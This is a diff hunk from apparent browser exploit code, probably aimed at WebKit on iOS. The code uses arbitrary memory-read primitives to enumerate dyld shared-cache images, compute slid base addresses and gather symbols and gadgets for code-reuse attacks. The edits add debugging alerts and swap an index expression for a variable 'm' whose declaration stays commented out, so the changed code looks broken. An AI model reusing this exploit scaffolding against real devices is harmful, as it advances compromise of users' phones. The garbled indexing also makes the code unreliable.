@@ -707,25 +707,25 @@ function exploit(){
        
         var syms = {};
         var gadgets = {};
-        var imgs  = Add(hdr, memory.u32(Add(hdr, 0x18)));
+        const imgs  = Add(hdr, memory.u32(Add(hdr, 0x18)));
         var nimgs = memory.u32(Add(hdr, 0x1c));
         for(var i = 0; i < nimgs; i++)
         {
         
            // var m = i * 0x20;
-            alert(memory.u32(Add(imgs,i * 0x20 + 0x18)))
-            var straddr = off2addr(segs, memory.u32(Add(imgs,i * 0x20 + 0x18)));
+            alert(memory.u32(Add(imgs,m + 0x18)))
+            var straddr = off2addr(segs, memory.u32(Add(imgs,m + 0x18)));
             var fn = function(i)
             {
-                var g = memory.copyfrom(Add(straddr, i),0,1);
-                alert("g"+g)
+                var g = memory.copyfrom(Add(straddr, i),0,75);
+               // alert("g"+g)
                 //alert("g[0]"+g[0])
                 return g;
 
 
             };
             alert("dyld image #"+i+":"+ab2str(fn()))
-            var base = Add(memory.read_i64(Add(imgs,i * 0x20),0), cache_slide);
+            var base = Add(memory.read_i64(Add(imgs,m),0), cache_slide);
             alert("base" + base);
             //alert(opcode_libs.some())
             if(opcode_libs.some(lib => strcmp(fn, lib)))
